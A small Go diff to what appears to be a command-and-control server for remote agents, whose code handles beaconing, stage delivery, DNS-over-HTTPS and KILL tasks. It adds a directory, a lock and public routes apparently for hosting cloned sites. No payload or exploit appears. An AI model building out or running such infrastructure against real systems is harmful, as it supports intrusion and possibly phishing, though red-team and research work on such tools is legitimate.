@@ -69,6 +69,8 @@ type Server struct {
 	meshMu    sync.RWMutex
 	meshPeers map[string]meshPeer // agentID → peer info
 
+	sitesMu sync.Mutex // protects site manifests and clone metadata updates
+
 	// ghostMu guards ghostAgents. When an agent is deleted from the DB its AES
 	// key is kept here so we can still send it a KILL task if it beacons again,
 	// preventing the 404→re-register loop.
@@ -169,6 +171,7 @@ func New(cfg Config) (*Server, error) {
 		cfg.DataDir,
 		filepath.Join(cfg.DataDir, "uploads"),
 		filepath.Join(cfg.DataDir, "downloads"),
+		filepath.Join(cfg.DataDir, "sites"),
 	} {
 		if err := os.MkdirAll(dir, 0700); err != nil {
 			return nil, fmt.Errorf("create directory %s: %w", dir, err)
@@ -211,6 +214,8 @@ func (s *Server) Start(ctx context.Context) error {
 	mux.HandleFunc("/upload/", s.handleUpload)
 	mux.HandleFunc("/dl/", s.handleDownload)
 	mux.HandleFunc("/stage/", s.handleStage)
+	mux.HandleFunc("/site/", s.handleSitePublic)
+	mux.HandleFunc("/hosted/", s.handleHostedPublic)
 	mux.HandleFunc("/dns-query", s.agentDoHQuery)
 	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
 		w.Write([]byte("ok"))
